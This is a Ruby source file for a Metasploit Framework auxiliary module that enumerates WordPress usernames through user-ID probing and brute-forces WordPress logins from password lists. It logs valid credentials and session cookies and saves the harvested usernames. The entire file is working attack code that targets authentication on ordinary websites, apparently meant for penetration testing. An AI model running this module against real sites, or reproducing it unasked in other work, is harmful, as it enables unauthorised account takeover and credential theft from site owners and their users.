##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Auxiliary
  include Msf::HTTP::Wordpress
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'          => 'Wordpress Brute Force and User Enumeration Utility',
      'Description'   => 'Wordpress Authentication Brute Force and User Enumeration Utility',
      'Author'        =>
        [
          'Alligator Security Team',
          'Tiago Ferreira <tiago.ccna[at]gmail.com>',
          'Zach Grace <zgrace[at]404labs.com>',
          'Christian Mehlmauer <FireFart[at]gmail.com'
        ],
      'References'     =>
        [
          ['BID', '35581'],
          ['CVE', '2009-2335'],
          ['OSVDB', '55713']
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options(
      [
        OptBool.new('VALIDATE_USERS', [ true, 'Validate usernames', true ]),
        OptBool.new('BRUTEFORCE', [ true, 'Perform brute force authentication', true ]),
        OptBool.new('ENUMERATE_USERNAMES', [ true, 'Enumerate usernames', true ]),
        OptString.new('RANGE_START', [false, 'First user id to enumerate', '1']),
        OptString.new('RANGE_END', [false, 'Last user id to enumerate', '10'])
    ], self.class)

  end

  def run_host(ip)

    unless wordpress_and_online?
      print_error("#{target_uri} does not seeem to be Wordpress site")
      return
    end

    usernames = []
    if datastore['ENUMERATE_USERNAMES']
      vprint_status("#{target_uri} - WordPress Enumeration - Running User Enumeration")
      usernames = enum_usernames
    end

    if datastore['VALIDATE_USERS']
      @users_found = {}
      vprint_status("#{target_uri} - WordPress Enumeration - Running User validation")
      each_user_pass { |user, pass|
        do_enum(user)
      }

      unless @users_found.empty?
        print_good("#{target_uri} - WordPress Enumeration - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
      end
    end

    if datastore['BRUTEFORCE']
      vprint_status("#{target_uri} - WordPress Brute Force - Running Bruteforce")
      if datastore['VALIDATE_USERS']
        if @users_found && @users_found.keys.size > 0
          vprint_status("#{target_uri} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
        end
      end

      # Brute-force using files.
      each_user_pass { |user, pass|
        if datastore['VALIDATE_USERS']
          next unless @users_found[user]
        end

        do_login(user, pass)
      }

      # Brute force previously found users
      if not usernames.empty?
        print_status("#{target_uri} - Brute-forcing previously found accounts...")
        passwords = load_password_vars(datastore['PASS_FILE'])
        usernames.each do |user|
          passwords.each do |pass|
            do_login(user, pass)
          end
        end
      end

    end
  end

  def do_enum(user=nil)
    print_status("#{target_uri} - WordPress Enumeration - Checking Username:'#{user}'")

    exists = wordpress_user_exists?(user)
    if exists
      print_good("#{target_uri} - WordPress Enumeration- Username: '#{user}' - is VALID")
      report_auth_info(
          :host => rhost,
          :sname => (ssl ? 'https' : 'http'),
          :user => user,
          :port => rport,
          :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
      )

      @users_found[user] = :reported
      return :next_user
    else
      vprint_error("#{target_uri} - WordPress Enumeration - Invalid Username: '#{user}'")
      return :skip_user
    end
  end


  def do_login(user=nil, pass=nil)
    vprint_status("#{target_uri} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")

    cookie = wordpress_login(user, pass)

    if cookie
      print_good("#{target_uri} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
      report_auth_info(
          :host => rhost,
          :port => rport,
          :sname => (ssl ? 'https' : 'http'),
          :user => user,
          :pass => pass,
          :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}, COOKIE=#{cookie}",
          :active => true
      )
      return :next_user
    else
      vprint_error("#{target_uri} - WordPress Brute Force - Failed to login as '#{user}'")
      return
    end
  end

  def enum_usernames
    usernames = []
    for i in datastore['RANGE_START']..datastore['RANGE_END']
      username = wordpress_userid_exists?(i)
      if username
        print_good "#{target_uri} - Found user '#{username}' with id #{i.to_s}"
        usernames << username
      end
    end

    if not usernames.empty?
      p = store_loot('wordpress.users', 'text/plain', rhost, usernames * "\n", "#{rhost}_wordpress_users.txt")
      print_status("#{target_uri} - Usernames stored in: #{p}")
    end

    return usernames
  end

end
